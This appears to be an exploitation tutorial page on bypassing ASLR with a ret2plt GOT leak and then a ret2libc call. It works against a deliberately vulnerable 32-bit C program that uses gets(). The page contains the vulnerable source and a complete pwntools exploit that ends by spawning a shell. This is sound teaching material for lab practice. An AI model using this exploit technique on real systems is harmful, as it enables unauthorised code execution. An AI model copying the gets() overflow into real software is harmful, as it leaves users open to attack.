# ret2plt ASLR bypass

## Overview

This time around, there's no leak. You'll have to use the ret2plt technique explained previously. Feel free to have a go before looking further on.

{% file src="../../../.gitbook/assets/ret2plt.zip" caption="ret2plt - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    puts("Come get me");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```

## Analysis

We're going to have to leak ASLR base somehow, and the only logical way is a ret2plt. We're not struggling for space as `gets()` takes in as much data as we want.

## Exploitation

All the basic setup

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```

Now we want to send a payload that leaks the real address of `puts`. As mentioned before, calling the PLT entry of a function is the same as calling the function itself; if we point the parameter to the GOT entry, it'll print out it's actual location. This is because in C string arguments for functions actually take a **pointer** to where the string can be found, so pointing it to the GOT entry \(which we know the location of\) will print it out.

```python
p.recvline()        # just receive the first output

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
```

But why is there a `main` there? Well, if we set the return address to random jargon, we'll leak libc base but then it'll crash; if we call `main` again, however, we essentially restart the binary - except we now know `libc` base so this time around we can do a ret2libc.

```python
p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)
```

Remember that the GOT entry won't be the only thing printed - `puts`, and most functions in C, print **until a null byte**. This means it will keep on printing GOT addresses, but the only one we care about is the first one, so we grab the first 4 bytes and use `u32()` to interpret them as a little-endian number. After that we ignore the the rest of the values as well as the `Come get me` from calling `main` again.

From here, we simply calculate libc base again and perform a basic ret2libc:

```python
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],            # exit is not required here, it's just nicer
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

And bingo, we have a shell!

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

## 64-bit

You know the drill - try the same thing for 64-bit. If you want, you can use pwntools' ROP capabilities - or, to make sure you understand calling conventions, be daring and do **both** :P

{% file src="../../../.gitbook/assets/ret2plt-64.zip" caption="ret2plt - 64-bit" %}

